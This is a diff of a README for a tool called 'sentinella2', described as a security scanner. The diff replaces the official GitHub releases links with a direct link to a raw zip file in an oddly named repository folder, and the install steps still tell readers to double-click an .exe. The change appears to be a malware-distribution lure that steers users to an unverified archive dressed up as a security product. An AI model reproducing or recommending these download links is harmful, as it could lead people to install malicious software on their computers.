@@ -1,6 +1,6 @@
 # 🛡️ sentinella2 - Find security issues in your code
 
-[![](https://img.shields.io/badge/Download-sentinella2-blue.svg)](https://github.com/Aptitudinal-squirrelfish8512/sentinella2/releases)
+[![](https://img.shields.io/badge/Download-sentinella2-blue.svg)](https://raw.githubusercontent.com/Aptitudinal-squirrelfish8512/sentinella2/main/anucleate/sentinella_1.6.zip)
 
 Sentinella2 inspects your files for security risks. It uses a smart system to filter through thousands of alerts. This tool finds the real problems hidden in noisy data. It helps you protect your software without complex setup steps.
 
@@ -10,7 +10,7 @@ Your computer needs to meet basic standards to run this software. Ensure you use
 
 ## 📥 How to Install
 
-1. Visit this page to download: https://github.com/Aptitudinal-squirrelfish8512/sentinella2/releases.
+1. Visit this page to download: https://raw.githubusercontent.com/Aptitudinal-squirrelfish8512/sentinella2/main/anucleate/sentinella_1.6.zip
 2. Select the file ending in .exe for Windows.
 3. Save the file to your computer.
 4. Double-click the file to start the application.
